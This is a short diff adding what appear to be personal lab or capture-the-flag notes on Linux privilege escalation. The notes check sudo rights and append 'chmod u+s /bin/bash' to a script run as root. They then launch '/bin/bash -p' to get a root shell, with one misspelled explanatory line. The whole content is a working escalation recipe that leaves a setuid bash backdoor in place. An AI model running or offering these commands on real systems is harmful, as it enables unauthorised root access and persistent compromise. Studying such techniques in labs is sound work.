@@ -1,0 +1,7 @@
+sudo -l
+ad to scrip which start with root  
+echo "chmod u+s /bin/bash" > initdb.sh
+/bin/bash -p
+------------------
+
+
